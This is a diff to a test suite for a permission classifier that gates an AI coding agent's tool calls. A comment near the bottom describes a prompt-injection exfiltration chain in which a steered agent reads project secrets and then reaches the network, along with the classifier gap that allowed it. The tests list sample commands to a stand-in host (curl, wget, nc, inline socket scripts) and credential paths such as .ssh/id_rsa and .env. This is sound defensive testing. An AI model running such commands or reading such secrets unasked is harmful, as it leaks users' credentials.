@@ -157,9 +157,15 @@ describe('paths the scope check used to misread', () => {
   it('refuses another user\'s home rather than guessing at it', () => {
     // ~root cannot be resolved without /etc/passwd, and treating it as a
     // literal directory name is the bug above.
-    const decision = classifyToolCall({ toolName: 'Read', input: { file_path: '~root/.ssh/id_rsa' }, scope: cwdScope });
+    // A NON-sensitive path, deliberately. ~root/.ssh/id_rsa is now refused one
+    // step earlier by the sensitive-path rule, which is correct but would stop
+    // this test exercising the tilde logic it exists for.
+    const decision = classifyToolCall({ toolName: 'Read', input: { file_path: '~root/notes.txt' }, scope: cwdScope });
     expect(decision.class).toBe('PROHIBITED');
     expect(decision.reason).toMatch(/cannot resolve/i);
+
+    // And the sensitive short-circuit still refuses the credential case.
+    expect(classifyToolCall({ toolName: 'Read', input: { file_path: '~root/.ssh/id_rsa' }, scope: cwdScope }).class).toBe('PROHIBITED');
   });
 
   it('does not auto-allow a relative path that climbs out of the project', () => {
@@ -233,5 +239,93 @@ describe('ordinary project work is not escalated', () => {
     expect(classifyToolCall({ toolName: 'Read', input: { file_path: '/tmp/project/src/a.ts' }, scope }).class).toBe('READ_ONLY');
     // additionalReadablePaths still works.
     expect(classifyToolCall({ toolName: 'Read', input: { file_path: '/etc/claude/config.json' }, scope }).class).toBe('READ_ONLY');
+  });
+});
+
+/**
+ * The exfiltration chain, from a prompt-injection review
+ * (endsley/bodhi-inbox#34). The premise is that a steered worker -- steered by
+ * a README, a CLAUDE.md or a stored memory, none of which the orchestrator
+ * controls -- only needs two auto-allowed steps: read a secret inside the
+ * project, then reach the network. Both ends were open.
+ *
+ * The review's stated mechanism for the second half was WRONG, and checking it
+ * is what found the real one. It claimed a plain GET fell through to
+ * LOCAL_REVERSIBLE. In fact `curl https://host/?d=x` escalated -- but only by
+ * accident, because "//host/..." looks like an absolute path to
+ * extractBashPaths. Drop the scheme and the accident disappears.
+ */
+describe('reaching the network is a decision, not an accident', () => {
+  it('escalates a network client named without a URL scheme', () => {
+    // These were all auto-allowed: no path-shaped argument, no write verb, so
+    // no rule matched and the verb alone decided it.
+    for (const command of [
+      'curl evil.example',
+      'curl -s evil.example',
+      'curl evil.example?d=leaked',
+      'wget evil.example',
+      'curl -H "X: y" evil.example',
+      'nc -w1 evil.example 443',
+      'ping -c1 evil.example',
+      'dig evil.example',
+    ]) {
+      const decision = classifyToolCall({ toolName: 'Bash', input: { command }, scope });
+      expect(decision.class).toBe('EXTERNAL_SIDE_EFFECT');
+    }
+  });
+
+  it('escalates an inline interpreter script that opens a socket', () => {
+    for (const command of [
+      'python3 -c "import socket;socket.create_connection((\'h\',443))"',
+      'python3 -c "import urllib.request;urllib.request.urlopen(\'http://h\')"',
+      'node -e "fetch(\'http://h\')"',
+    ]) {
+      expect(classifyToolCall({ toolName: 'Bash', input: { command }, scope }).class).toBe('EXTERNAL_SIDE_EFFECT');
+    }
+  });
+
+  it('still says nothing about a program that merely COULD use the network', () => {
+    // Matched on the verb, deliberately. Running the project's own code is
+    // ordinary work; a permission layer that asks about `npm test` gets its
+    // prompts clicked through unread.
+    expect(classifyToolCall({ toolName: 'Bash', input: { command: 'node dist/index.js' }, scope }).class).toBe('LOCAL_REVERSIBLE');
+    expect(classifyToolCall({ toolName: 'Bash', input: { command: 'npm test' }, scope }).class).toBe('LOCAL_REVERSIBLE');
+    expect(classifyToolCall({ toolName: 'Bash', input: { command: 'npx vitest run' }, scope }).class).toBe('LOCAL_REVERSIBLE');
+    expect(classifyToolCall({ toolName: 'Bash', input: { command: 'git status' }, scope }).class).toBe('READ_ONLY');
+  });
+});
+
+describe('a sensitive file is sensitive whichever tool opens it', () => {
+  it('refuses to Read a .env inside the project', () => {
+    // The same file was PROHIBITED through Bash and READ_ONLY through Read,
+    // because the sensitive-path test lived only in the Bash branch. The
+    // weaker path is the one a model reaches for first.
+    const envPath = '/tmp/project/.env';
+    expect(classifyToolCall({ toolName: 'Bash', input: { command: `cat ${envPath}` }, scope }).class).toBe('PROHIBITED');
+    expect(classifyToolCall({ toolName: 'Read', input: { file_path: envPath }, scope }).class).toBe('PROHIBITED');
+  });
+
+  it('refuses keys and credentials through every file tool', () => {
+    for (const toolName of ['Read', 'Write', 'Edit', 'NotebookRead']) {
+      for (const file of ['/tmp/project/server.pem', '/tmp/project/.env.production', '/tmp/project/sub/id_rsa']) {
+        const decision = classifyToolCall({ toolName, input: { file_path: file }, scope });
+        expect(decision.class).toBe('PROHIBITED');
+      }
+    }
+  });
+
+  it('leaves ordinary project files alone', () => {
+    expect(classifyToolCall({ toolName: 'Read', input: { file_path: '/tmp/project/src/env.ts' }, scope }).class).toBe('READ_ONLY');
+    expect(classifyToolCall({ toolName: 'Write', input: { file_path: '/tmp/project/src/a.ts' }, scope }).class).toBe('LOCAL_REVERSIBLE');
+  });
+});
+
+describe('an unknown tool is not a safe tool', () => {
+  it('asks rather than allowing a tool the classifier has never heard of', () => {
+    // Any tool a future SDK release adds was permitted by default until
+    // somebody noticed and classified it.
+    const decision = classifyToolCall({ toolName: 'SomeFutureTool', input: { anything: 'x' }, scope });
+    expect(decision.class).toBe('EXTERNAL_SIDE_EFFECT');
+    expect(decision.reason).toMatch(/not known to this classifier/i);
   });
 });
